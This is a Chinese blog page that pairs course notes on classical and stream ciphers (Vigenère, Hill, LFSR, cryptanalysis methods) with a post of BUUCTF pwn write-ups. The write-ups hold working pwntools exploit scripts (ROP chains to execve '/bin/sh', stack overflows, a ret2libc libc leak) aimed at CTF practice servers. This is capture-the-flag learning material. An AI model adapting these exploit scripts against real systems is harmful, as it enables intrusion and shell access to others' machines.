<li><strong>维吉尼亚密码</strong><br> 维吉尼亚密码选择一个字符串作为密钥，并将明文按照字符串长度分为长度相等的若干组，对于每一组中的明文字符，按照对应位置密文的字母确定移位数量。破解方式较上述三种复杂，但仍能进行唯密文攻击。<br> 数学表述：<br> $P &#x3D; C &#x3D; K &#x3D; (Z_{26})^m$，m为正整数<br> 对$\forall k&#x3D;(k_1, k_2, …, k_m)\in K, x &#x3D; (x_1, x_2, …, x_m)\in P, y&#x3D;(y_1, y_2, …, y_m)$，定义有<br> $e_k(x)&#x3D;(x_1+k_1, x_2+k_2, …,x_m+k_m)$<br> $d_k(y)&#x3D;(y_1-k_1,y_2-k_2,…y_m-k_m)$<br> (以上运算均在模26下进行)</li>
<li><strong>希尔密码</strong><br> 希尔密码的加密方式可以说是仿射密码、移位密码、代换密码的超集。将明文字符串分为长度相等的若干组，对每一组进行相同的矩阵乘法（也就是一种较仿射密码更加复杂的线性变换），获取结果即为密文。<br> 数学描述：<br> $P &#x3D; C &#x3D; (Z_{26})^m$，m为不小于2的正整数<br> K是定义在$Z_{26}$上的$m\times m$可逆矩阵的集合<br> 取密钥$k \in K$，k为一个$m\times m$矩阵，记为$(k_{ij})$，对于$x&#x3D;(x_1, x_2, …, x_m)\in P, y&#x3D;(y_1, y_2, …, y_m)\in C$，定义有<br> $e_k(x)&#x3D;xk, d_k(y)&#x3D;yk^{-1}$<br> (以上运算均在模26下进行)</li>
<li><strong>置换密码</strong><br> 将明文打乱顺序变为密文。<br> 数学描述：<br> $P &#x3D; C &#x3D; (Z_{26})^m$，m为正整数<br> K是由所有定义在集合{1, 2, …, m}上的置换组成<br> 对于任意密钥$\pi$，定义<br> $e_\pi(x_1,x_2,…x_m)&#x3D;(x_{\pi(1)},x_{\pi(2)},…,x_{\pi(m)})$<br> $d_\pi(y_1,y_2,..,y_m)&#x3D;(y_{\pi^{-1}(1)},x_{\pi^{-1}(2)},…,x_{\pi^{-1}(m)})$<br> 置换密码实际上是希尔密码的特殊形式，其置换矩阵与排列有关。置换矩阵的行数和列数等于一组字符数量，如果这一组中明文第i个位置被换成了第j个位置的元素，则第i列的第j个数为1。</li>
</ol>
<h2 id="三-古典密码分析"><a href="#三-古典密码分析" class="headerlink" title="三. 古典密码分析"></a>三. 古典密码分析</h2><ul>
<li><strong>概念</strong><br>  密码分析：分析者在已知密码体制（密码算法及实现的全部详细资料）的前提下破译使用的密钥。<br>  常用密码分析攻击有4类：<br>  唯密文攻击（COA）：攻击者仅掌握密文的攻击<br>  已知明文攻击（KPA）：攻击者知道不由他控制的明文以及对应的密文<br>  选择明文攻击（CPA）：攻击者可以在一定程度上选择明文获取密文<br>  选择密文攻击（CCA）：攻击者可以在一定程度上选择密文获取明文<br>  这4种攻击方式依次增强，如果一种加密算法能够抵抗后面的攻击，那么也一定能够抵抗前面的攻击。</li>
<li><strong>古典密码攻击要点</strong><br>  只有当密文长度足够长时，才能够分析大多数古典密码。<br>  只能分析由有具体语义明文加密而来的密文，否则即使解密完成也不知道解密出来的是不是密文。<br>  通常需要使用英文字母频率分析与反复猜测。</li>
<li><strong>英文字母频率规律</strong><br>  第1档：E出现次数远多于其他字母<br>  第2档：TAOINSHR<br>  第3档：CUMWFGYPB<br>  第4档：VKJXQZ<br>  常见双字母固定序列：TH HE IN ER AN RE ED ON ES ST EN AT TO NT HA ND OU EA NG AS OR TI IS ET IT AR TE SE HI OF<br>  常见三字母固定序列：THE ING AND HER ERE ENT THA NTH WAS ETH FOR DTH<br>  根据经验，有些字母不可能组合出现与同一个单词之中，如j和所有辅音字母相邻的概率都极低。<br>  根据密文字母出现频率高低进行猜测和验证，得到密文越长，越符合统计规律</li>
</ul>
<h3 id="1-仿射密码分析"><a href="#1-仿射密码分析" class="headerlink" title="1. 仿射密码分析"></a>1. 仿射密码分析</h3><p>分析仿射密码需要得到a与b的值，通过密文中字母的出现频率猜测出现频率最高的是什么字母，只需猜测两个字母便可以列方程组求解。注意解a须与26互素，否则猜测错误。</p>
<h3 id="2-代换密码分析"><a href="#2-代换密码分析" class="headerlink" title="2. 代换密码分析"></a>2. 代换密码分析</h3><p>分析代换密码采用与仿射密码类似的方法，使用字频分析，逐一猜测，根据经验，最早被破译的通常是’the’，要查找文本看看有没有多次存在的3字符序列。</p>
<h3 id="3-维吉尼亚密码分析"><a href="#3-维吉尼亚密码分析" class="headerlink" title="3. 维吉尼亚密码分析"></a>3. 维吉尼亚密码分析</h3><p>维吉尼亚密码分析较为复杂。由于其是多表代换，因此需要首先确认每一组字符的长度，这里应该使用Kasiski测试法：在密文中找到相同的3字符或以上序列，找出它们所在的起始位置，对这些位置的差求公因数，这些公因数之一就很可能是密钥的长度。</p>
<p>确认密钥字长度m也可以使用重合指数法。</p>
<ul>
<li>重合指数法<ul>
<li>在一个字符串X中随机取出两个字母，这两个字母恰好相同的概率记为$I_c(X)$</li>
<li>对于完全随机字符串，$I_c(X)$&#x3D;1&#x2F;26，约为0.038</li>
<li>对于英文文本，$I_c(X)&#x3D;\sum_{i&#x3D;0}^{25}p_i^2\approx 0.065$</li>
<li>在单表代换密码中，密文的重合指数应该与明文相同。<br>将密文按照密钥字长度分为m段，每一段的重合指数应该接近于0.065，通过尝试不同的m可以获取重合指数最为接近0.065的那一个m就是密钥字长度。</li>
<li>对于一段确定的英文文本，计算重合指数的公式为：$I_c(X)&#x3D;\frac{\sum_{i&#x3D;0}^{25}f_i(f_i-1)}{n(n-1)}$，其中$f_i$为每个密文字母的出现次数（频数）</li>
<li>确认密钥的长度之后，对于分出来的每一段密文，其中每一个密文字符相对于明文字符的偏移都是相同的。这里仍然可以使用重合指数法计算偏移量。计算方法：密文转换成明文之后，其明文的重合指数应该近似于0.065，因此对于每一个偏移量，均计算一次其与明文的重合指数，最接近于0.065的即为正确偏移量。计算公式：$M_g&#x3D;\sum_{i&#x3D;0}^{25}p_i\times \frac{f_{i+g}}{n’}$，其中$p_i$为每个字母在英文中出现的概率，$f_i$是每个字母在密文中出现的次数，$n’$是这一段密文的长度。</li>
</ul>
</li>
</ul>
<h3 id="4-希尔密码分析"><a href="#4-希尔密码分析" class="headerlink" title="4. 希尔密码分析"></a>4. 希尔密码分析</h3><p>破译希尔密码的关键是找到转换矩阵，其难以通过唯密文攻击破解，但可以很容易通过已知明文攻击破译。知道明文和密文之后，就可以直接计算出矩阵的值：$Y&#x3D;XK\rightarrow K&#x3D;X^{-1}Y$，前提是需要知道密钥矩阵的阶数。</p>
<h2 id="四-流密码"><a href="#四-流密码" class="headerlink" title="四. 流密码"></a>四. 流密码</h2><h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1. 概念"></a>1. 概念</h3><p>之前的古典密码中对于连续明文元素使用相同密钥K加密，与分组密码的区别是：需要设计复杂的加密函数提高安全性，而且经常需要对明文进行填充以确保分组长度完整。</p>
<p>流密码将明文看做字符串或者比特串，逐字符或逐位进行加密。为防止密钥穷举，使用与明文长度相等的密钥（无限）流进行加密。关键在于如何生成密钥流。</p>
<h3 id="2-Vernam-密码"><a href="#2-Vernam-密码" class="headerlink" title="2. Vernam 密码"></a>2. Vernam 密码</h3><p>密钥与明文一样长且没有统计规律的加密。</p>
<p>加密：$C_i&#x3D;P_i+K_i\mod 26, C_i&#x3D;P_i\oplus K_i$<br>解密：$P_i&#x3D;C_i-K_i\mod 26, P_i&#x3D;C_i\oplus K_i$</p>
<p>需要构造与明文一样长的随机密钥。（这样的密钥不能重复，否则无法对抗已知明文攻击）</p>
<h3 id="3-流密码特点"><a href="#3-流密码特点" class="headerlink" title="3. 流密码特点"></a>3. 流密码特点</h3><p>运算简单，实时性强，安全性依赖于密钥流产生方法</p>
<h3 id="4-流密码分类"><a href="#4-流密码分类" class="headerlink" title="4. 流密码分类"></a>4. 流密码分类</h3><p>按照密钥周期性分类分为周期流密码和非周期流密码<br>周期流密码：存在某一个固定正整数r使得密钥流每隔r个字符以后重复<br>非周期流密码：对于任何正整数密钥都不重复，如一次一密乱码本</p>
<p>按照密钥产生方式分为同步流密码和异步流密码<br>同步流密码：密钥流的产生独立于消息流，如分组密码中的OFB（输出反馈）模式<br>异步流密码：每一个密钥字符都是由前面n个明文或密文字符推导出来的，其中n为定值。如分组密码中的CFB（密码反馈）模式</p>
<h3 id="5-同步流密码"><a href="#5-同步流密码" class="headerlink" title="5. 同步流密码"></a>5. 同步流密码</h3><p>使用某种算法，由一个初始密钥变换出于明文串相互独立的密钥流。数学定义如下：</p>
<p>同步流密码是一个六元组$(P,C,K,L,E,D)$和一个函数$g$，且满足以下条件：</p>
<ol>
<li>$P,C,K$分别为明文、密文、密钥的有限集</li>
<li>$L$是密钥流字母表有限集</li>
<li>$g$是密钥流生成器，g使用密钥$k\in K$作为输入，产生无限长的密钥流$Z&#x3D;z_1z_2…$，其中$z_1\in L$</li>
<li>对于任意$z\in L$，都有一个加密规则（函数）$e_z:P\rightarrow C\in E$和相应的解密规则（函数）$d_z:C\rightarrow P\in D$，并且对于每个明文$x\in P$满足$d_z(e_z(x))&#x3D;x$</li>
</ol>
<h3 id="6-流密码与分组密码的关系"><a href="#6-流密码与分组密码的关系" class="headerlink" title="6. 流密码与分组密码的关系"></a>6. 流密码与分组密码的关系</h3><p>分组密码可以用于生成密钥序列<br>维吉尼亚密码可以看做流密码的一种特殊情况（一种短周期同步流密码，密钥流是周期为m的密钥序列）</p>
<h3 id="7-密钥流生成"><a href="#7-密钥流生成" class="headerlink" title="7. 密钥流生成"></a>7. 密钥流生成</h3><p>多使用线性递推关系产生伪随机序列（与多种高级语言的随机函数类似），这一类随机函数需要一个种子，被称为初始向量，线性递推算法可以使用硬件实现，此硬件称为线性反馈移位寄存器（LFSR）</p>
<h3 id="8-异步流密码"><a href="#8-异步流密码" class="headerlink" title="8. 异步流密码"></a>8. 异步流密码</h3><p>同步流密码存在有周期问题，异步流密码的密钥流由于与明文元素或密文元素有关，因此不存在周期问题。</p>
<h3 id="9-自动密钥密码体制：异步流密码示例"><a href="#9-自动密钥密码体制：异步流密码示例" class="headerlink" title="9. 自动密钥密码体制：异步流密码示例"></a>9. 自动密钥密码体制：异步流密码示例</h3><p>一个六元组$(P,C,K,L,E,D)$，满足：</p>
<ol>
<li>$P&#x3D;C&#x3D;K&#x3D;L&#x3D;Z_{26}$</li>
<li>密钥流定义：$z_1&#x3D;k\in K, z_i&#x3D;x_{i-1}, i\ge 2$</li>
<li>对于$\forall z\in K, x,y\in Z_{26}$，定义<br>$$e_z(x)&#x3D;(x+z)\mod 26, d_z(y)&#x3D;(y-z)\mod 26$$</li>
</ol>
<h3 id="10-线性移位反馈寄存器-LFSR"><a href="#10-线性移位反馈寄存器-LFSR" class="headerlink" title="10.线性移位反馈寄存器(LFSR)"></a>10.线性移位反馈寄存器(LFSR)</h3><p>对于流密码，需要通过随机序列进行加密，但真正随机的序列难以应用，一般使用一个种子生成出一个伪随机的流密钥。<br>这种方式可以通过硬件方式实现，即LFSR，第n+1位由前面n位中某些位的异或得到。<br>$$a_{n+1}&#x3D;c_na_1\oplus c_{n-1}a_2\oplus …\oplus c_1a_n$$<br>上式中的c<del>i</del>是固定值。</p>
<p><strong>定义1</strong> 周期序列：存在正整数t，满足对于任意的$k\ge 0,a_{k+t}&#x3D;a_k$，其中最小的正整数t称为序列的周期，序列称为周期序列。<br><strong>定义2</strong> 特征多项式：设q元n级线性反馈移位寄存器的递推公式为：<br>$$a_{n}&#x3D;c_na_0\oplus c_{n-1}a_1\oplus …\oplus c_1a_{n-1},c_i\in F_q,c_n&#x3D;1$$<br>其变换矩阵T定义为<br>$$T&#x3D;\begin{pmatrix}0 &amp; 0 &amp; 0 &amp; … &amp; c_n\<br>1&amp;0&amp;0&amp;…&amp;c_{n-1}\<br>0&amp;1&amp;0&amp;…&amp;c_{n-2}\<br>…&amp;…&amp;…&amp;…&amp;…\<br>0&amp;0&amp;…&amp;1&amp;c_1\end{pmatrix}$$<br>$(a_0,a_1,…,a_{n-1})T&#x3D;(a_1,a_2,…,a_n)$<br>矩阵T的特征多项式$f(x)&#x3D;|xI-T|&#x3D;x^n-c_1x^{n-1}-…-c_{n-1}x-c_n$称为n级线性反馈移位寄存器L的特征多项式<br><strong>定义3</strong> 设T为F<del>q</del>上n级LFSR的变换矩阵，I是n×n单位矩阵，使得T^k^&#x3D;I成立的最小的正整数k称为变换矩阵T的周期，记为$\rho(T)$。<br><strong>定义4</strong> 可满足多项式：设$f(x)\in F_q[x],f(0)\ne 0$，如果$f(T)&#x3D;0$，则称f(x)为T可满足的多项式。所有T可满足的多项式中，次数最低的首1多项式称为T的极小多项式（与信数的极小多项式定义不太相同，这里的多项式不一定不可约），满足$f(x)|x^k-1$的最小正整数称为$f(x)$的周期，记为$\rho(f)$<br><strong><font color=blue>引理1</font></strong> 设$f(x)\in F_q[x]$是首1不可约多项式，$f(0)\ne 0$，则$\rho(f)$等于有限域$F_q[x]<em>{f(x)}$中元素x的阶。<br><strong><font color=blue>引理2</font></strong> 设$f(x)\in F_q[x]$是首1多项式，$f(0)\ne 0,f(x)&#x3D;g(x)^b$，其中$g(x)$为$F_q[x]$中的不可约多项式，$char(F_q)&#x3D;p$，t是使得$p^t\ge b$的最小正整数，则有$\rho(f)&#x3D;\rho(g)p^t$<br>证明：<br>$g(x)|x^{\rho(g)}-1$（拉格朗日定理）$\Rightarrow g(x)^{p^t}|(x^{\rho(g)}-1)^{p^t}$<br>$char(F_q)&#x3D;p,p^t\ge b,g(x)^{p^t}|(x^{\rho(g)}-1)^{p^t}\Rightarrow f(x)|x^{\rho(g)p^t}-1$<br>另一方面，$f(x)|x^{\rho(f)}-1,\therefore f(x)|(x^{\rho(f)}-1,x^{\rho(g)p^t}-1)&#x3D;x^{(\rho(f),\rho(g)p^t)}-1$<br>$\therefore \rho(f)&#x3D;(\rho(f),\rho(g)p^t),\rho(f)|\rho(g)p^t$（信数定理，$\rho(f)$应该是满足$f(x)|x^m-1$的最小次数）<br>同样，$g(x)|f(x)\Rightarrow g(x)|x^{\rho(f)}-1\Rightarrow \rho(g)|\rho(f)$<br>这说明$\rho(f)$是形如$\rho(g)p^s(0\le s\le t)$的整数<br>设$\rho(f)&#x3D;\rho(g)p^s,s&lt;t,p^s&lt;b,f(x)|x^{\rho(g)p^s}-1,g(x)^b|x^{\rho(g)p^s}-1&#x3D;(x^{\rho(g)}-1)^{p^s}$<br>$g(x)^{b-p^s}|(\frac{x^{\rho(g)}-1}{g(x)})^{p^s}\Rightarrow g(x)|(\frac{x^{\rho(g)}-1}{g(x)})^{p^s}\Rightarrow g(x)|(\frac{x^{\rho(g)}-1}{g(x)})\Rightarrow g(x)^2|x^{\rho(g)}-1$（说明$x^{\rho(g)}-1$应该有重因式）<br>$(\rho(g),p)&#x3D;1,(x^{\rho(g)}-1,(x^{\rho(g)}-1)’)&#x3D;1$<br>$\therefore x^{\rho(g)}-1$无重因式，矛盾（信数定理）。故原命题成立<br><strong><font color=blue>引理3</font></strong> 设$f(x)\in F_q[x]$是首1多项式，$f(0)\ne 0$，且$f(x)&#x3D;\prod</em>{i&#x3D;1}^sf_i(x)$，其中$f_i(x)$是$F_q[x]$中两两互素的多项式，则$\rho(f)&#x3D;[\rho(f_1),\rho(f_2),…,\rho(f_s)]$<br>证明：<br>$f_i(x)|x^{\rho(f_i)}-1,\rho(f_i)|[\rho(f_1),\rho(f_2),…,\rho(f_s)]$<br>$\Rightarrow f_i(x)|x^{[\rho(f_1),\rho(f_2),…,\rho(f_s)]}-1$<br>$\Rightarrow \rho(f)|[\rho(f_1),\rho(f_2),…,\rho(f_s)]$（$f_i(x)$两两互素！）<br>又$f_i(x)|f(x),f(x)|x^{\rho(f)}-1$<br>$\Rightarrow f_i(x)|x^{\rho(f)}-1\Rightarrow \rho(f_i)|\rho(f)$<br>$\Rightarrow [\rho(f_1),\rho(f_2),…,\rho(f_s)]|\rho(f)$<br>$\therefore \rho(f)&#x3D;[\rho(f_1),\rho(f_2),…,\rho(f_s)]$<br><strong><font color=red>定理1</font></strong> 设$T$的极小多项式为$h(x)\in F_q[x]$，若$f(x)\in F_q[x]$满足$f(T)&#x3D;0$，那么$h(x)|f(x)$<br><strong><font color=red>定理2</font></strong> 设$T$是$F_q$上n级线性反馈移位寄存器L的变换矩阵，T的特征多项式为$f(x)$，那么$f(x)$是T的极小多项式<br><strong><font color=red>定理3</font></strong> 设$T$是$F_q$上n级线性反馈移位寄存器L的变换矩阵，T的特征多项式为$f(x)$，那么$\rho(T)&#x3D;\rho(f)$<br><strong><font color=red>定理4</font></strong> 给定$F_q$上任意一个非零周期序列$a$，可以找到一个能产生序列$a$的线性反馈移位寄存器L，它的特征多项式$f(x)$满足：对于可产生$a$的任意线性反馈移位寄存器，若其特征多项式为g(x)，都有$f(x)|g(x)$。满足上述条件的f(x)唯一<br><strong><font color=purple>定义5</font></strong> 定理4描述的首1特征多项式f(x)为序列$a$的极小多项式<br><strong><font color=red>定理5</font></strong> 非零周期序列$a$的周期等于其极小多项式f(x)的周期</p>
<p>m序列的伪随机性：<br>(1) 若t为奇数，则0-1序列的一个周期内0的个数比1的个数多1个或少1个，若t为偶数则其个数相等<br>(2) 在长度为t的周期内，1游程的个数为游程总数的1&#x2F;2，2游程的个数为总数的1&#x2F;2^2^，以此类推。（n游程：连续的n个0或1序列，且前后为1或0。如00110001中第2<del>3为是一个1的2游程）<br>(3) 异相自相关函数为常数（自相关函数：定义在Z</del>2<del>上的周期序列a</del>0<del>a</del>1<del>…则$c_a(\tau)&#x3D;\sum_{i&#x3D;0}^{t-1}\eta(a_i)\eta(a_{i+\tau}),\tau\in Z$，其中$\eta$是Z</del>2~上的加法群到{1,-1}的乘法群的同构$\eta(0)&#x3D;1,\eta(1)&#x3D;-1$，有$\eta(a+b)&#x3D;\eta(a)\eta(b)$）<br>平衡特性：m序列1个数比0个数多1<br>游程特性：1的最大游程为n游程，有且仅有1个；1个0的n-1游程。n&gt;2时，设r为不超过n-2的任一整数，则任何1的r游程数目为$1+\sum_{r&#x3D;1}^{n-2}2^{n-r-2}&#x3D;2^{n-2}$；出现0游程的个数为$2^{n-2}$,游程总数为$2^{n-i}$<br>自相关特性：$c_a(\tau)&#x3D;\sum_{i&#x3D;0}^{2^n-2}\eta(a_i)\eta(a_{i+\tau})&#x3D;2^n-1,\tau\equiv 0(\mod 2^n-1); &#x3D;-1, \tau \ne 0(\mod 2^n-1)$</p>
<p>异步流密码的加密和解密是一个对称的加解密过程。</p>
<h4 id="LFSR流密码分析："><a href="#LFSR流密码分析：" class="headerlink" title="LFSR流密码分析："></a>LFSR流密码分析：</h4><p>分析目标为：获取LFSR的结构（即密钥——LFSR的初态z<del>0</del>,z<del>1</del>,…和递推公式[抽头序列c<del>1</del>,c<del>2</del>,…]），使用唯密文攻击较为困难，使用一直明文攻击。<br>$z_k&#x3D;\sum_{j&#x3D;1}^nc_jz_{k-j}$<br>如果能够得到长度不小于2n的明文-密文对，就容易求出其初态和抽头序列（假设n已知）<br>密钥比特流可以直接将明密文求和得到，其中前面的一组作为初态<br>$$(z_n,z_{n+1},…,z_{2n-1})&#x3D;(c_n,c_{n-1},…,c_1)\begin{pmatrix}z_0 &amp; z_1 &amp; … &amp; z_{n-1}\<br>z_1&amp;z_2&amp;…&amp;z_n\<br>…&amp;…&amp;…&amp;…\<br>z_{n-1}&amp;z_n&amp;…&amp;z_{2n-2}\end{pmatrix}$$<br>根据上式可计算$(c_n,c_{n-1},…,c_1)$的值</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/buuctf-pwn-write-ups-6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/buuctf-pwn-write-ups-6/" class="post-title-link" itemprop="url">buuctf-pwn write-ups (6)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-28 22:28:11 / Modified: 22:54:18" itemprop="dateCreated datePublished" datetime="2023-02-28T22:28:11+08:00">2023-02-28</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/buuctf-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">buuctf 系列</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="buu047-cmcc_simplerop"><a class="markdownIt-Anchor" href="#buu047-cmcc_simplerop"></a> buu047-cmcc_simplerop</h1>
<p>和上一道题的思路完全相同。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26121</span>)</span><br><span class="line">int80 = <span class="number">0x80493E1</span></span><br><span class="line">popeax_ret = <span class="number">0x80BAE06</span></span><br><span class="line">popedx_ret = <span class="number">0x806e82a</span></span><br><span class="line">popecx_ebx_ret = <span class="number">0x806E851</span></span><br><span class="line">addesp0x14_ret = <span class="number">0x807b36c</span></span><br><span class="line">bss = <span class="number">0x80EB060</span></span><br><span class="line">read = <span class="number">0x806CD50</span></span><br><span class="line">payload = cyclic(<span class="number">0x14</span> + <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(read)			<span class="comment"># call read()</span></span><br><span class="line">payload += p32(addesp0x14_ret)	<span class="comment"># return address, add esp to execute latter ROP</span></span><br><span class="line">payload += p32(<span class="number">0</span>)				<span class="comment"># arg #1 of read(): stdin</span></span><br><span class="line">payload += p32(bss)				<span class="comment"># arg #2 of read(): a bss address</span></span><br><span class="line">payload += p32(<span class="number">0x8</span>)				<span class="comment"># arg #3 of read(): read length</span></span><br><span class="line">payload += p32(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">payload += p32(popeax_ret)		<span class="comment"># eax = 0x11(SYS_EXECVE)</span></span><br><span class="line">payload += p32(<span class="number">11</span>)</span><br><span class="line">payload += p32(popecx_ebx_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)				<span class="comment"># ebx = &#x27;/bin/sh&#x27;</span></span><br><span class="line">payload += p32(bss)				<span class="comment"># edx = 0</span></span><br><span class="line">payload += p32(popedx_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)				<span class="comment"># ecx = 0</span></span><br><span class="line">payload += p32(int80)			<span class="comment"># int 80</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span> + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu048-picoctf_2018_buffer-overflow-2"><a class="markdownIt-Anchor" href="#buu048-picoctf_2018_buffer-overflow-2"></a> buu048-picoctf_2018_buffer overflow 2</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27446</span>)</span><br><span class="line">io.sendline(cyclic(<span class="number">0x6C</span>+<span class="number">4</span>) + p32(<span class="number">0x80485CB</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0xdeadc0de</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu049-xdctf2015_pwn200"><a class="markdownIt-Anchor" href="#buu049-xdctf2015_pwn200"></a> buu049-xdctf2015_pwn200</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25724</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x6C</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;vuln&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Welcome to XDCTF2015~!\n&#x27;</span>, payload)</span><br><span class="line">write = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write)</span><br><span class="line">base = write - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sys = libc.dump(<span class="string">&#x27;system&#x27;</span>) + base</span><br><span class="line">binsh = libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) + base</span><br><span class="line">payload = cyclic(<span class="number">0x6C</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(sys)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu050-bbys_tu_2016"><a class="markdownIt-Anchor" href="#buu050-bbys_tu_2016"></a> buu050-bbys_tu_2016</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27499</span>)</span><br><span class="line">io.sendline(cyclic(<span class="number">0xC</span> + <span class="number">12</span>) + p32(<span class="number">0x804856D</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu051-mrctf2020_easyoverflow"><a class="markdownIt-Anchor" href="#buu051-mrctf2020_easyoverflow"></a> buu051-mrctf2020_easyoverflow</h1>
<p>连上之后输48个无效字节+‘n0t_r3@11y_f1@g’</p>
<h1 id="buu052-wustctf2020_getshell_2"><a class="markdownIt-Anchor" href="#buu052-wustctf2020_getshell_2"></a> buu052-wustctf2020_getshell_2</h1>
<p>这道题只能溢出到返回地址+4字节的地方，直接修改返回地址到system函数的话参数写不进去，所以利用shell函数返回到指令’call _system’的地方，在后面就可以写函数参数’sh’（截取/bbbbbbbbin_what_the_f?ck__–??/sh的最后两个字节）了。</p>
